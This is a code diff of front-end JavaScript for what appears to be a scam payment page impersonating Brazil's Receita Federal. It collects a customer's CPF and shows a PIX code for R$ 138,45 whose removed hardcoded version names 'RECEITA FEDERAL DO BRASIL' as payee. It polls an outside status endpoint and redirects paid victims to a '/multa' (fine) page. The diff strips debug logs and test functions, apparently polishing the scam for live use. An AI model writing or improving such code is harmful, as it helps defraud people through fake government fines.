@@ -493,7 +493,6 @@ async function openPixModal() {
             cpf: customerData.cpf || ''
         };
         
-        console.log('📊 Dados completos do cliente recuperados do localStorage:', clientData);
         
         const response = await fetch('/generate-pix', {
             method: 'POST',
@@ -613,7 +612,7 @@ function showPixModal(data) {
                 <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
                     <label style="display: block; margin-bottom: 10px; font-weight: 600; color: #044785;">Código PIX (Copia e Cola) - Valor: R$ 138,45:</label>
                     <div style="margin-bottom: 10px;">
-                        <textarea id="pixCodeInputDisplay" readonly style="width: 100%; height: 120px; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-family: monospace; font-size: 0.85rem; resize: none; line-height: 1.3; word-wrap: break-word;">00020101021226880014br.gov.bcb.pix2566qrcode.microcashif.com.br/pix/2454926c-6e4c-4252-9a42-04751d0a13065204000053039865802BR5924 RECEITA FEDERAL DO BRASIL6015SAO PAULO62070503***63040C53</textarea>
+                        <textarea id="pixCodeInputDisplay" readonly style="width: 100%; height: 120px; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-family: monospace; font-size: 0.85rem; resize: none; line-height: 1.3; word-wrap: break-word;">${data.pixCode || data.pix_code}</textarea>
                         <input type="hidden" id="pixCodeInputReal" value="${data.pixCode || data.pix_code}">
                     </div>
                     <button onclick="copyPixCode()" style="width: 100%; padding: 12px 16px; background: #044785; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 600;">
@@ -721,8 +720,6 @@ function startPaymentMonitoring(transactionId) {
     window.paymentMonitorInterval = setInterval(async () => {
         try {
             const statusUrl = `https://recoveryfy.replit.app/api/order/${transactionId}/status`;
-            console.log(`🔄 Verificando status da transação: ${transactionId}`);
-            console.log(`📡 URL de verificação: ${statusUrl}`);
             
             const response = await fetch(statusUrl);
             
@@ -732,12 +729,9 @@ function startPaymentMonitoring(transactionId) {
             }
             
             const statusData = await response.json();
-            console.log('📊 Status recebido:', statusData);
-            console.log(`🎯 Status atual: "${statusData.status}"`);
             
             // Check if payment is approved
             if (statusData.status === 'approved' || statusData.status === 'paid') {
-                console.log('🎉 PAGAMENTO APROVADO! Redirecionando para /multa...');
                 
                 // Clear monitoring
                 clearInterval(window.paymentMonitorInterval);
@@ -747,24 +741,19 @@ function startPaymentMonitoring(transactionId) {
                 closePixModal();
                 
                 // Redirect immediately to /multa
-                console.log('🔄 Executando redirecionamento...');
                 window.location.href = '/multa';
-            } else {
-                console.log(`⏳ Pagamento ainda pendente - Status: ${statusData.status}`);
             }
         } catch (error) {
             console.error('❌ Erro ao verificar status do pagamento:', error);
         }
     }, 1000); // Check every 1 second
     
-    console.log(`⏰ Monitoramento configurado com timeout de 20 minutos`);
     
     // Timeout after 20 minutes (PIX expiration)
     setTimeout(() => {
         if (window.paymentMonitorInterval) {
             clearInterval(window.paymentMonitorInterval);
             window.paymentMonitorInterval = null;
-            console.log('⏰ Monitoramento encerrado por timeout (20 minutos)');
         }
     }, 20 * 60 * 1000); // 20 minutes
 }
@@ -908,28 +897,15 @@ async function confirmPhone() {
 // Start chat when page loads
 document.addEventListener('DOMContentLoaded', initializeChat);
 
-// Test function for payment monitoring (for debugging)
-function testPaymentMonitoring() {
-    console.log('🧪 Testando monitoramento de pagamento com nova API...');
-    startPaymentMonitoring('7228484a-95fe-42d3-b537-b97834b1f5aa');
-}
-
-// Test function for manual confirmation popup
-function testPopup() {
-    console.log('🧪 Testando popup de confirmação...');
-    showManualPaymentConfirmation('test-transaction-id');
-}
 
 // Function to show manual payment confirmation popup
 function showManualPaymentConfirmation(transactionId) {
     // Check if PIX modal is still visible
     const pixModal = document.getElementById('pixModal');
     if (!pixModal) {
-        console.log('Modal PIX não está mais visível, cancelando popup de confirmação');
         return;
     }
     
-    console.log('⏰ Mostrando popup de confirmação manual após 20 segundos');
     
     const confirmationPopup = `
         <div id="paymentConfirmationPopup" style="
@@ -1009,11 +985,9 @@ async function handlePaymentConfirmation(transactionId, confirmed) {
     if (overlay) overlay.remove();
     
     if (confirmed) {
-        console.log('✅ Usuário confirmou pagamento, verificando status...');
         
         try {
             const statusUrl = `https://recoveryfy.replit.app/api/order/${transactionId}/status`;
-            console.log(`🔄 Verificação manual do status: ${statusUrl}`);
             
             const response = await fetch(statusUrl);
             
@@ -1023,10 +997,8 @@ async function handlePaymentConfirmation(transactionId, confirmed) {
             }
             
             const statusData = await response.json();
-            console.log('📊 Status da verificação manual:', statusData);
             
             if (statusData.status === 'approved' || statusData.status === 'paid') {
-                console.log('🎉 PAGAMENTO CONFIRMADO MANUALMENTE! Redirecionando para /multa...');
                 
                 // Clear automatic monitoring
                 if (window.paymentMonitorInterval) {
@@ -1040,7 +1012,6 @@ async function handlePaymentConfirmation(transactionId, confirmed) {
                 // Redirect to /multa
                 window.location.href = '/multa';
             } else {
-                console.log('⚠️ Pagamento ainda não foi aprovado');
                 alert('Pagamento ainda não foi identificado. Aguarde alguns instantes e tente novamente.');
             }
         } catch (error) {
@@ -1048,7 +1019,6 @@ async function handlePaymentConfirmation(transactionId, confirmed) {
             alert('Erro ao verificar pagamento. Tente novamente.');
         }
     } else {
-        console.log('❌ Usuário informou que não realizou o pagamento');
         // Continue with automatic monitoring
     }
 }
